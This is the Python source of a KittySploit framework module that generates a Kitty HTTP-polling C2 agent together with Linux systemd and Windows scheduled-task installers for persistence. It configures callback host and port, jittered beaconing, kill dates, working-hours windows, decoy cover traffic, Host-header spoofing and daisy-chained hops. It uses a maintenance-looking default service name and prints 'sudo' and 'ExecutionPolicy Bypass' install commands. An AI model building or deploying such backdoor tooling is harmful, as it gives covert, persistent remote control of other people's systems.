from kittysploit import *

from lib.c2.agent_installer import (
    build_install_readme,
    build_linux_install_sh,
    build_windows_schtasks_install_ps1,
)
from lib.c2.agent_spec import AgentSpec
from lib.c2.backdoor_identity import apply_implant_identity
from lib.c2.beacon_profile import BeaconProfile
from lib.c2.kitty_agent import build_kitty_agent_from_spec


class Module(Backdoor):
    """Generate Kitty HTTP agent + Linux systemd / Windows schtasks installers."""

    __info__ = {
        "name": "Kitty Agent Installer Pack",
        "description": (
            "Writes kitty_agent.py plus install_linux.sh (systemd) and/or "
            "install_windows.ps1 (scheduled task). Controller: "
            "listeners/multi/reverse_http_polling."
        ),
        "author": "KittySploit Team",
        "platform": Platform.MULTI,
        "arch": Arch.PYTHON,
        "session_type": SessionType.POLLING,
        "listener": "listeners/multi/reverse_http_polling",
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(8088, "Callback port", True)
    url_prefix = OptString("/c2", "URL prefix (must match listener)", False)
    client_id = OptString("", "Client/implant ID (auto with implant_identity)", False)
    implant_identity = OptBool(True, "Generate Ed25519 implant identity", False)
    implant_id = OptString("", "Existing implant ID to reuse", False)
    poll_interval = OptInteger(10, "Base poll interval seconds", False)
    jitter_percent = OptInteger(35, "Poll jitter percent", False)
    kill_date = OptString("", "Kill date ISO YYYY-MM-DD", False)
    working_hours = OptString("", "HH:MM-HH:MM window", False)
    timezone = OptString("UTC", "Timezone", False)
    sleep_outside_hours = OptInteger(3600, "Sleep outside hours", False)
    user_agent = OptString("Mozilla/5.0", "HTTP User-Agent", False)
    host_header = OptString("", "Optional Host header", False)
    payload_comms_host = OptString("", "Optional connect host", False)
    cover_traffic = OptBool(True, "Decoy HTTP requests", False)
    use_ssl = OptBool(False, "HTTPS callback", False)
    chain_token = OptString("", "Daisy-chain token", False)
    chain_listen_port = OptInteger(0, "Local hop port (0=off)", False)
    chain_listen_host = OptString("0.0.0.0", "Hop bind address", False)

    install_target = OptEnum(["both", "linux", "windows"], "Install scripts to generate", False)
    service_name = OptString("ks-maint", "Linux systemd unit / Windows task base name", False)
    install_dir_linux = OptString("/opt/ks-agent", "Linux install directory", False)
    install_dir_windows = OptString("C:\\ProgramData\\ks-agent", "Windows install directory", False)
    python_binary_linux = OptString("python3", "Python binary on Linux target", False)
    python_binary_windows = OptString("python", "Python binary on Windows target", False)
    agent_filename = OptString("kitty_agent.py", "Agent script filename", False)
    output_prefix = OptString("", "Output subdir prefix (empty = random)", False)

    def check(self):
        return bool(str(self.lhost or "").strip()) and int(self.lport or 0) > 0

    def _build_agent(self) -> str:
        identity = apply_implant_identity(self)
        spec = AgentSpec.from_module(
            self,
            client_id=identity.implant_id if identity else None,
            private_key_pem=identity.private_key_pem if identity else None,
        )
        if not identity and not str(self.client_id or "").strip():
            spec.client_id = "kitty1"
        return build_kitty_agent_from_spec(spec)

    def run(self):
        if not self.check():
            print_error("lhost and lport are required")
            return False

        if str(self.lhost).strip() in ("127.0.0.1", "localhost", "::1"):
            print_warning(
                "LHOST is loopback — agent connects to 127.0.0.1 on the TARGET. "
                "Set LHOST to your KittySploit IP for remote callbacks."
            )

        target = str(self.install_target or "both").lower()
        agent_name = str(self.agent_filename or "kitty_agent.py").strip() or "kitty_agent.py"
        if not agent_name.endswith(".py"):
            agent_name += ".py"

        prefix = str(self.output_prefix or "").strip()
        if not prefix:
            prefix = self.random_text(8) + "_kitty_installer"
        subdir = f"{prefix}/"

        script = self._build_agent()
        if not self.write_out_dir(subdir + agent_name, script):
            print_error("Failed to write agent script")
            return False

        svc = str(self.service_name or "ks-maint").strip() or "ks-maint"
        cid = str(getattr(self, "_implant_identity_obj", None).implant_id if getattr(self, "_implant_identity_obj", None) else self.client_id or "kitty1")
        callback = f"{self.lhost}:{self.lport}{self.url_prefix or '/c2'}"
        linux_cmd = None
        windows_cmd = None

        if target in ("both", "linux"):
            linux_sh = build_linux_install_sh(
                install_dir=str(self.install_dir_linux or "/opt/ks-agent"),
                agent_filename=agent_name,
                service_name=svc,
                python_binary=str(self.python_binary_linux or "python3"),
            )
            if not self.write_out_dir(subdir + "install_linux.sh", linux_sh):
                print_error("Failed to write install_linux.sh")
                return False
            linux_cmd = f"chmod +x install_linux.sh && sudo ./install_linux.sh"

        if target in ("both", "windows"):
            win_ps1 = build_windows_schtasks_install_ps1(
                install_dir=str(self.install_dir_windows or r"C:\ProgramData\ks-agent"),
                agent_filename=agent_name,
                task_name=svc,
                python_binary=str(self.python_binary_windows or "python"),
            )
            if not self.write_out_dir(subdir + "install_windows.ps1", win_ps1):
                print_error("Failed to write install_windows.ps1")
                return False
            windows_cmd = "powershell -ExecutionPolicy Bypass -File .\\install_windows.ps1"

        identity_notes = ""
        pub = getattr(self, "_implant_public_key_pem", None)
        if pub:
            identity_notes = (
                f"client_id={cid}\n"
                "Set listener implant_public_key to the public key saved under output/implant_keys/"
            )
        readme = build_install_readme(
            title="Kitty Agent Installer Pack",
            callback=callback,
            linux_cmd=linux_cmd,
            windows_cmd=windows_cmd,
            notes=(
                "Start listeners/multi/reverse_http_polling with matching LHOST/LPORT/url_prefix. "
                + (identity_notes or f"client_id={cid}")
            ),
        )
        self.write_out_dir(subdir + "README.md", readme)

        print_success(f"Generated installer pack under: {prefix}/")
        print_info(f"Agent: {agent_name}  callback: {callback}")
        if pub:
            print_info(f"Implant identity: {cid} — configure listener implant_public_key")
        if linux_cmd:
            print_info(f"Linux: {linux_cmd}")
        if windows_cmd:
            print_info(f"Windows: {windows_cmd}")
        return True
